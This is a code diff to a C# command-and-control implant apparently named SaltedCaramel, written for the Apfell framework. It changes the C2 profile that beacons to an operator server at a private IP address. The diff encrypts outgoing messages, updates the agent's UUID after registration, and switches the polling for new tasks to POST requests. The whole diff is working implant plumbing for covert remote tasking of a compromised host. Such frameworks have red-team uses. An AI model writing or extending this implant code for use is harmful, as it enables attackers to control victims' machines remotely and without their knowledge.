@@ -119,11 +119,16 @@ namespace Profiles
                 throw new Exception("WARNING: HMAC did not match message!");
             }
         }
+
+        internal void UpdateUUID(string newUUID)
+        {
+            uuid = ASCIIEncoding.ASCII.GetBytes(newUUID);
+        }
     }
 
     class DefaultProfile : C2Profile
     {
-        private static Crypto cryptor;
+        private static DefaultEncryption cryptor;
         private static WebClient client;
         private const string Endpoint = "https://192.168.38.192/api/v1.4/agent_message";
 
@@ -139,7 +144,7 @@ namespace Profiles
         // Make a request to the Apfell endpoint and decrypt the result
         private static string Get(string message)
         {
-            return cryptor.Decrypt(client.DownloadString($"{Endpoint}/{message}"));
+            return cryptor.Decrypt(client.DownloadString($"{Endpoint}/{cryptor.Encrypt(message)}"));
         }
 
         // Encrypt and post a string to the Apfell server
@@ -183,7 +188,9 @@ namespace Profiles
                 // If it was successful, initialize implant
                 // Response is { "status": "success", "id": <id> }
                 JObject resultJSON = (JObject)JsonConvert.DeserializeObject(result);
-                return resultJSON.Value<string>("id");
+                string newUUID = resultJSON.Value<string>("id");
+                cryptor.UpdateUUID(newUUID);
+                return newUUID;
             }
             else
             {
@@ -197,12 +204,9 @@ namespace Profiles
         /// <returns>CaramelTask with the next task to execute</returns>
         override public SCTask CheckTasking(SaltedCaramel.SCImplant agent)
         {
-            string json = "{";
-            json += "\"action\":\"get_tasking\",";
-            json += "\"tasking_size\":1,";
-            json += "}";
-            SCTask task = JsonConvert.DeserializeObject<SCTask>(Get(json));
-            if (task.command != "none")
+            string json = "{\"action\":\"get_tasking\", \"tasking_size\":1 }";
+            SCTask task = JsonConvert.DeserializeObject<SCTask>(Post(json));
+            if (task.command != "none" && task.command != null)
                 Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
             return task;
         }
